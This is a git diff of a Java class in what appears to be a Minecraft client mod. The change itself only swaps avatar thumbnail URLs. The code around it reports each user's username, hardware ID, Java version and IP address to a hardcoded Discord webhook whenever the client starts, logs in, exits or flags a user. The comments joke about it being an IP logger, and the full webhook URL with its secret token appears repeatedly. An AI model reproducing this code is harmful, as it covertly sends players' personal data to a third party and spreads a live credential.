@@ -14,6 +14,8 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.UUID;
 
+import static me.alpha432.oyvey.util.traits.Util.mc;
+
 public class WebhookInformer { // If u call this class rat then pls get brain
 	public static String enteredKey = "";
 
@@ -22,7 +24,7 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + " successfully logged in!");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "?size=128&overlay");
+            embed.setThumbnail("https://minotar.net/helm/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "/100.png");
 			//embed.addField("Key", "||" + enteredKey + "||", false);
             embed.addField("Hwid", HWIDUtil.getHWID(), false);
             embed.setColor(Color.GREEN);
@@ -42,7 +44,7 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + " failed the Hwid check! (Possible Attacker)");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "?size=128&overlay");
+            embed.setThumbnail("https://minotar.net/helm/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "/100.png");
 			//embed.addField("Key", "||" + enteredKey + "||", false);
 			embed.addField("IP", "||" + getIP() + "||", false);
 			embed.addField("HWID", HWIDUtil.getHWID(), false);
@@ -62,7 +64,7 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + " ran Client");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getSession().getSessionId().toString() + "?size=128&overlay");
+            embed.setThumbnail("https://minotar.net/helm/" + mc.getSession().getUsername() + "/100.png");
             embed.addField("JVM", System.getProperty("java.version") + ' ' + System.getProperty("java.vendor"), false); // Trouble shooting features
             embed.addField("HWID", HWIDUtil.getHWID(), false);
             embed.setColor(Color.GREEN);
@@ -79,7 +81,7 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + " exited Minecraft");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "?size=128&overlay");
+            embed.setThumbnail("https://minotar.net/helm/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "/100.png");
             embed.setColor(Color.GRAY);
             embed.setFooter(getTime(), null);
             webhook.addEmbed(embed);
@@ -94,7 +96,7 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/1269333122550337578/Ovfv2R4uP-DTt3vmbxaQxULMxVtdU2wIEcl27tXwS4MgR66eNqxfRpSdPJSOiiow6h0H");
             WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
             embed.setTitle(MinecraftClient.getInstance().getSession().getUsername() + "'s experience has been Flagged!");
-            embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "?size=128&overlay");
+            embed.setThumbnail("https://minotar.net/helm/" + MinecraftClient.getInstance().getGameProfile().getId().toString() + "/100.png");
 			//embed.addField("Key", "||" + enteredKey + "||", false);
 			embed.addField("IP", "||" + getIP() + "||", false); // Omg a IP Logger!1!!1!1 :skrim:
 			//embed.addField("HWID", HWID.getHWID(), false);
